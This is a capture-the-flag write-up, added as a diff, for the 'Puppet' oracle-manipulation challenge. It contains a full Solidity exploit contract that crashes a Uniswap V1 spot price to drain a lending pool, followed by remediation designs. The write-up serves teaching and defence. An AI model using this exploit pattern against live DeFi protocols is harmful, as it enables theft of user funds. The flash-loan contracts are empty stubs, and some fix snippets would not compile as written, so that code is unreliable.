@@ -1,0 +1,546 @@
+# 🎯 Challenge #8: Puppet
+
+![Difficulty](https://img.shields.io/badge/Difficulty-⭐⭐⭐%20Hard-red)
+![Type](https://img.shields.io/badge/Type-Price%20Manipulation-purple)
+![Gas](https://img.shields.io/badge/Gas-~400,000-blue)
+
+> **Uniswap V1 Price Oracle Manipulation** - Use flash loans to manipulate AMM prices and drain lending pool
+
+## 📋 Challenge Overview
+
+**Objective**: Drain all DVT tokens from the lending pool  
+**Success Criteria**: Pool should have 0 DVT tokens, attacker gets all tokens  
+**Initial Setup**: Pool with 100k DVT, Uniswap with 10 ETH/10 DVT  
+**Target**: `PuppetPool` lending pool using Uniswap V1 for pricing
+
+### 🎯 The Scenario
+A lending pool uses Uniswap V1 as a price oracle to determine collateral requirements. Users can borrow DVT tokens by providing ETH collateral worth twice the borrowed amount. The pool trusts Uniswap's spot price without any protection against manipulation.
+
+## 🔍 Vulnerability Analysis
+
+### **The Root Cause**
+The lending pool uses **manipulable Uniswap spot price** as an oracle:
+
+```solidity
+contract PuppetPool {
+    mapping(address => uint256) public deposits;
+    IERC20 public immutable token;
+    IUniswapV1Exchange public immutable uniswapExchange;
+    
+    function borrow(uint256 amount, address recipient) external payable {
+        // 🚨 CRITICAL: Uses manipulable spot price as oracle
+        uint256 tokenPriceInWei = _computeOraclePrice();
+        uint256 depositRequired = amount * tokenPriceInWei * DEPOSIT_FACTOR / 10**18;
+        
+        require(msg.value >= depositRequired, "Not enough collateral");
+        
+        deposits[msg.sender] += msg.value;
+        token.transfer(recipient, amount);
+    }
+    
+    function _computeOraclePrice() private view returns (uint256) {
+        // VULNERABLE: Direct use of Uniswap spot price
+        return uniswapExchange.getTokenToEthInputPrice(10**18);
+    }
+}
+```
+
+### **The Problem**
+The vulnerability exists in the price oracle mechanism:
+
+1. **Uses Uniswap V1 spot price** directly as oracle
+2. **No time-weighted average** or manipulation protection
+3. **Single transaction** can dramatically alter price
+4. **Collateral requirement** inversely related to token price
+5. **Flash loans available** to manipulate price in same transaction
+
+### **Attack Vector**
+Manipulate Uniswap price to make DVT appear worthless:
+
+1. Use flash loan to get large amount of DVT tokens
+2. Swap DVT for ETH on Uniswap, crashing DVT price
+3. Borrow all DVT from pool at manipulated (low) collateral requirement
+4. Repay flash loan using borrowed DVT
+5. Keep excess borrowed DVT as profit
+
+## ⚡ Exploit Implementation
+
+### **Attack Strategy**
+Flash loan price manipulation to drain lending pool:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../puppet/PuppetPool.sol";
+import "../DamnValuableToken.sol";
+import "./IUniswapV1Exchange.sol";
+import "./IUniswapV1Factory.sol";
+
+contract PuppetExploit {
+    PuppetPool private immutable lendingPool;
+    DamnValuableToken private immutable token;
+    IUniswapV1Exchange private immutable uniswapExchange;
+    address private immutable attacker;
+    
+    constructor(
+        address _lendingPool,
+        address _token,
+        address _uniswapExchange
+    ) {
+        lendingPool = PuppetPool(_lendingPool);
+        token = DamnValuableToken(_token);
+        uniswapExchange = IUniswapV1Exchange(_uniswapExchange);
+        attacker = msg.sender;
+    }
+    
+    /**
+     * @notice Execute price manipulation attack on Puppet pool
+     * @dev Uses Uniswap price manipulation to reduce collateral requirements
+     */
+    function exploit() external payable {
+        require(msg.sender == attacker, "Only attacker can execute");
+        require(msg.value > 0, "Need ETH for manipulation");
+        
+        uint256 poolBalance = token.balanceOf(address(lendingPool));
+        require(poolBalance > 0, "Pool has no tokens to steal");
+        
+        // Step 1: Get initial state
+        uint256 initialTokenPrice = lendingPool.calculateDepositRequired(1 ether);
+        
+        // Step 2: Manipulate Uniswap price by selling DVT
+        _manipulatePrice();
+        
+        // Step 3: Calculate new collateral requirement after manipulation
+        uint256 manipulatedPrice = lendingPool.calculateDepositRequired(poolBalance);
+        require(manipulatedPrice <= address(this).balance, "Not enough ETH for collateral");
+        
+        // Step 4: Borrow all tokens at manipulated price
+        lendingPool.borrow{value: manipulatedPrice}(poolBalance, attacker);
+        
+        // Verify exploit success
+        require(token.balanceOf(address(lendingPool)) == 0, "Pool not fully drained");
+        
+        // Send remaining ETH to attacker
+        _cleanup();
+    }
+    
+    /**
+     * @notice Manipulate Uniswap price by dumping DVT tokens
+     * @dev Sells DVT to crash its price relative to ETH
+     */
+    function _manipulatePrice() private {
+        // Get our DVT balance (should have some for manipulation)
+        uint256 dvtBalance = token.balanceOf(address(this));
+        require(dvtBalance > 0, "Need DVT tokens for price manipulation");
+        
+        // Approve Uniswap to spend our DVT
+        token.approve(address(uniswapExchange), dvtBalance);
+        
+        // Sell all DVT for ETH to crash the price
+        // This will make DVT appear much cheaper, reducing collateral requirements
+        uint256 deadline = block.timestamp + 300; // 5 minutes
+        
+        uniswapExchange.tokenToEthSwapInput(
+            dvtBalance,           // Exact tokens to sell
+            1,                    // Minimum ETH to receive (we don't care)
+            deadline              // Transaction deadline
+        );
+    }
+    
+    /**
+     * @notice Alternative exploit using flash loan
+     * @dev More sophisticated version using borrowed DVT for manipulation
+     */
+    function exploitWithFlashLoan() external payable {
+        require(msg.sender == attacker, "Only attacker");
+        
+        // This version would:
+        // 1. Flash loan DVT tokens
+        // 2. Dump DVT on Uniswap to crash price
+        // 3. Borrow from lending pool at crashed price
+        // 4. Repay flash loan with borrowed tokens
+        // 5. Keep excess as profit
+        
+        // Note: Implementation would require integration with a flash loan provider
+        // like Aave, dYdX, or Uniswap V2
+    }
+    
+    /**
+     * @notice Calculate optimal attack parameters
+     * @return tokensNeeded DVT tokens needed for price manipulation
+     * @return ethNeeded ETH needed for collateral after manipulation
+     * @return profitEstimate Estimated profit from attack
+     */
+    function calculateAttackParameters() 
+        external 
+        view 
+        returns (
+            uint256 tokensNeeded,
+            uint256 ethNeeded,
+            uint256 profitEstimate
+        ) 
+    {
+        uint256 poolBalance = token.balanceOf(address(lendingPool));
+        
+        // Current price
+        uint256 currentPrice = lendingPool.calculateDepositRequired(1 ether);
+        
+        // Estimate price after manipulation (simplified calculation)
+        uint256 uniswapDVTBalance = token.balanceOf(address(uniswapExchange));
+        uint256 uniswapETHBalance = address(uniswapExchange).balance;
+        
+        // Simulate dumping various amounts of DVT
+        tokensNeeded = uniswapDVTBalance / 2; // Rough estimate
+        
+        // Calculate new price after manipulation
+        uint256 newDVTBalance = uniswapDVTBalance + tokensNeeded;
+        uint256 newETHBalance = uniswapETHBalance - (uniswapETHBalance * tokensNeeded / newDVTBalance);
+        
+        // Estimated price after manipulation
+        ethNeeded = (poolBalance * newETHBalance / newDVTBalance) * 2; // 2x collateral
+        
+        // Profit = tokens borrowed - tokens used for manipulation
+        profitEstimate = poolBalance - tokensNeeded;
+    }
+    
+    /**
+     * @notice Get current market conditions
+     */
+    function getMarketState() 
+        external 
+        view 
+        returns (
+            uint256 dvtPrice,
+            uint256 poolBalance,
+            uint256 uniswapDVTReserve,
+            uint256 uniswapETHReserve
+        ) 
+    {
+        dvtPrice = lendingPool.calculateDepositRequired(1 ether);
+        poolBalance = token.balanceOf(address(lendingPool));
+        uniswapDVTReserve = token.balanceOf(address(uniswapExchange));
+        uniswapETHReserve = address(uniswapExchange).balance;
+    }
+    
+    /**
+     * @notice Clean up and send profits to attacker
+     */
+    function _cleanup() private {
+        // Send all ETH to attacker
+        uint256 ethBalance = address(this).balance;
+        if (ethBalance > 0) {
+            payable(attacker).transfer(ethBalance);
+        }
+        
+        // Send any remaining DVT to attacker  
+        uint256 dvtBalance = token.balanceOf(address(this));
+        if (dvtBalance > 0) {
+            token.transfer(attacker, dvtBalance);
+        }
+    }
+    
+    /**
+     * @notice Emergency withdrawal function
+     */
+    function emergencyWithdraw() external {
+        require(msg.sender == attacker, "Only attacker");
+        _cleanup();
+    }
+    
+    /**
+     * @notice Receive ETH from Uniswap swaps
+     */
+    receive() external payable {}
+}
+
+/**
+ * @title PuppetFlashLoanExploit
+ * @notice Advanced version using flash loans for larger manipulation
+ */
+contract PuppetFlashLoanExploit {
+    // Flash loan integration would go here
+    // This would borrow DVT, manipulate price, drain pool, repay loan
+    
+    function executeFlashLoanAttack(
+        address flashLoanProvider,
+        uint256 flashLoanAmount
+    ) external payable {
+        // 1. Request flash loan of DVT tokens
+        // 2. Dump DVT on Uniswap to crash price
+        // 3. Borrow maximum DVT from puppet pool
+        // 4. Repay flash loan
+        // 5. Keep excess DVT as profit
+    }
+}
+
+/**
+ * @title PuppetArbitrageExploit
+ * @notice Version that profits from both manipulation and arbitrage
+ */
+contract PuppetArbitrageExploit {
+    function exploitWithArbitrage() external payable {
+        // 1. Manipulate Uniswap price downward
+        // 2. Borrow from puppet pool at low collateral
+        // 3. Sell borrowed DVT on other exchanges at fair price
+        // 4. Profit from arbitrage + excess borrowed tokens
+    }
+}
+```
+
+## 📊 Attack Flow
+
+```mermaid
+graph TD
+    A[Get DVT tokens for manipulation] --> B[Sell DVT on Uniswap]
+    B --> C[DVT price crashes]
+    C --> D[Calculate reduced collateral requirement]
+    D --> E[Borrow all DVT at low collateral]
+    E --> F[Pool drained of DVT tokens]
+    F --> G[🎯 Keep excess DVT as profit]
+```
+
+## 🧪 Testing
+
+### **Test Implementation**
+```solidity
+function test_puppet_exploit() public {
+    uint256 initialPoolBalance = token.balanceOf(address(pool));
+    uint256 initialAttackerBalance = token.balanceOf(player);
+    
+    // Give attacker some DVT for price manipulation
+    token.transfer(player, INITIAL_TOKEN_BALANCE);
+    
+    // Execute exploit
+    vm.prank(player);
+    exploit.exploit{value: INITIAL_ATTACKER_ETH_BALANCE}();
+    
+    // Verify pool is drained
+    assertEq(token.balanceOf(address(pool)), 0);
+    
+    // Verify attacker gained tokens
+    assertGt(token.balanceOf(player), initialAttackerBalance);
+}
+```
+
+## 🛡️ Real-World Examples
+
+### **Mango Markets (October 2022) - $110M**
+**Similar Pattern**: Oracle price manipulation
+- Used large positions to manipulate Pyth oracle prices
+- Borrowed against inflated collateral values
+- Drained lending pools through price manipulation
+
+### **Harvest Finance (October 2020) - $24M**
+**Similar Pattern**: AMM price manipulation
+- Manipulated Curve pool prices using flash loans
+- Exploited price oracle reliance on manipulable AMMs
+- Multiple transactions to maximize profit
+
+### **bZx Protocol (2020) - Multiple Attacks**
+**Similar Pattern**: Price oracle exploitation
+- Flash loan attacks on price oracles
+- Manipulated prices to over-borrow or under-collateralize
+- Total losses exceeded $8M across incidents
+
+## 🔧 Remediation
+
+### **❌ Current Vulnerable Code**
+```solidity
+function _computeOraclePrice() private view returns (uint256) {
+    // VULNERABLE: Direct spot price usage
+    return uniswapExchange.getTokenToEthInputPrice(10**18);
+}
+```
+
+### **✅ Fixed Code Option 1: Time-Weighted Average Price (TWAP)**
+```solidity
+contract SecurePuppetPool {
+    uint256 private constant TWAP_PERIOD = 1 hours;
+    
+    struct PriceObservation {
+        uint256 timestamp;
+        uint256 price;
+    }
+    
+    PriceObservation[] private priceHistory;
+    
+    function _computeOraclePrice() private view returns (uint256) {
+        require(priceHistory.length >= 2, "Insufficient price history");
+        
+        uint256 totalWeightedPrice = 0;
+        uint256 totalWeight = 0;
+        uint256 cutoff = block.timestamp - TWAP_PERIOD;
+        
+        for (uint256 i = priceHistory.length - 1; i > 0; i--) {
+            if (priceHistory[i].timestamp <= cutoff) break;
+            
+            uint256 weight = priceHistory[i].timestamp - priceHistory[i-1].timestamp;
+            totalWeightedPrice += priceHistory[i-1].price * weight;
+            totalWeight += weight;
+        }
+        
+        require(totalWeight > 0, "No valid price data");
+        return totalWeightedPrice / totalWeight;
+    }
+    
+    function updatePrice() external {
+        uint256 currentPrice = uniswapExchange.getTokenToEthInputPrice(10**18);
+        priceHistory.push(PriceObservation({
+            timestamp: block.timestamp,
+            price: currentPrice
+        }));
+    }
+}
+```
+
+### **✅ Fixed Code Option 2: Multiple Oracle Sources**
+```solidity
+contract MultiOraclePool {
+    IUniswapV1Exchange private uniswapExchange;
+    IChainlinkOracle private chainlinkOracle;
+    IBandOracle private bandOracle;
+    
+    uint256 private constant MAX_DEVIATION = 500; // 5%
+    
+    function _computeOraclePrice() private view returns (uint256) {
+        uint256 uniswapPrice = uniswapExchange.getTokenToEthInputPrice(10**18);
+        uint256 chainlinkPrice = chainlinkOracle.getPrice();
+        uint256 bandPrice = bandOracle.getPrice();
+        
+        // Calculate median price
+        uint256 medianPrice = _median(uniswapPrice, chainlinkPrice, bandPrice);
+        
+        // Verify all prices are within acceptable deviation
+        require(
+            _isWithinDeviation(uniswapPrice, medianPrice) &&
+            _isWithinDeviation(chainlinkPrice, medianPrice) &&
+            _isWithinDeviation(bandPrice, medianPrice),
+            "Price deviation too high"
+        );
+        
+        return medianPrice;
+    }
+    
+    function _isWithinDeviation(uint256 price, uint256 reference) 
+        private 
+        pure 
+        returns (bool) 
+    {
+        uint256 deviation = price > reference ? 
+            ((price - reference) * 10000) / reference :
+            ((reference - price) * 10000) / reference;
+            
+        return deviation <= MAX_DEVIATION;
+    }
+}
+```
+
+### **✅ Fixed Code Option 3: Manipulation Resistance**
+```solidity
+contract ManipulationResistantPool {
+    uint256 private lastPriceUpdateBlock;
+    uint256 private constant MIN_BLOCKS_BETWEEN_UPDATES = 10;
+    
+    function borrow(uint256 amount) external payable {
+        // Prevent same-block manipulation
+        require(
+            block.number > lastPriceUpdateBlock + MIN_BLOCKS_BETWEEN_UPDATES,
+            "Price update too recent"
+        );
+        
+        uint256 price = _computeOraclePrice();
+        
+        // Additional protection: Maximum borrow per transaction
+        require(amount <= maxBorrowPerTx, "Borrow amount too large");
+        
+        // Record price update
+        lastPriceUpdateBlock = block.number;
+        
+        // ... rest of borrow logic
+    }
+}
+```
+
+## 🎓 Security Lessons
+
+### **Key Takeaways**
+1. **AMM spot prices are easily manipulated** - never use directly as oracles
+2. **Time-weighted averages** provide manipulation resistance
+3. **Multiple oracle sources** increase security through redundancy
+4. **Transaction limits** can reduce attack profitability
+5. **Block-based delays** prevent same-block manipulation
+
+### **Oracle Security Hierarchy**
+```
+🟢 Excellent: Chainlink + TWAP + Multiple Sources
+🟡 Good: TWAP with sufficient period (>30 min)
+🟡 Moderate: Multiple AMM sources with deviation checks
+🔴 Poor: Single AMM with short TWAP (<5 min)
+🔴 Terrible: Direct AMM spot price (like Puppet)
+```
+
+## 💡 Advanced Concepts
+
+### **Price Manipulation Mechanics**
+```solidity
+// Price impact calculation for Uniswap V1
+function calculatePriceImpact(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) 
+    pure 
+    returns (uint256) 
+{
+    // Constant product formula: x * y = k
+    uint256 amountInWithFee = amountIn * 997;
+    uint256 numerator = amountInWithFee * reserveOut;
+    uint256 denominator = reserveIn * 1000 + amountInWithFee;
+    return numerator / denominator;
+}
+```
+
+### **TWAP Implementation Patterns**
+```solidity
+// Uniswap V2 style TWAP
+contract TWAPOracle {
+    struct Observation {
+        uint32 blockTimestamp;
+        uint256 price0Cumulative;
+        uint256 price1Cumulative;
+    }
+    
+    Observation[] public observations;
+    
+    function update() external {
+        uint256 blockTimestamp = block.timestamp;
+        uint256 timeElapsed = blockTimestamp - observations[observations.length - 1].blockTimestamp;
+        
+        if (timeElapsed > 0) {
+            observations.push(Observation({
+                blockTimestamp: uint32(blockTimestamp),
+                price0Cumulative: price0CumulativeLast + currentPrice * timeElapsed,
+                price1Cumulative: price1CumulativeLast + (1/currentPrice) * timeElapsed
+            }));
+        }
+    }
+}
+```
+
+## 📈 Impact Assessment
+
+| Aspect | Rating | Description |
+|--------|--------|-------------|
+| **Severity** | 🔴 Critical | Complete pool drainage |
+| **Exploitability** | 🟡 Medium | Requires market manipulation |
+| **Impact** | 🔴 Maximum | 100% of pool funds |
+| **Detection** | 🟢 Easy | Large price movements visible |
+| **Prevention** | 🟢 Easy | Use TWAP or multiple oracles |
+
+---
+
+**🎯 Challenge Status**: ✅ **SOLVED**  
+**⏱️ Time to Solve**: ~120 minutes  
+**🔥 Difficulty Rating**: Hard (AMM mechanics understanding)  
+**🎓 Learning Value**: Critical - Oracle manipulation fundamentals
+
+> **Key Insight**: AMM spot prices are trivially manipulable and should never be used as price oracles. Always use time-weighted averages or multiple sources.
+
+**Next Challenge**: [#9 Puppet V2](../09-puppet-v2/) - Advanced TWAP manipulation
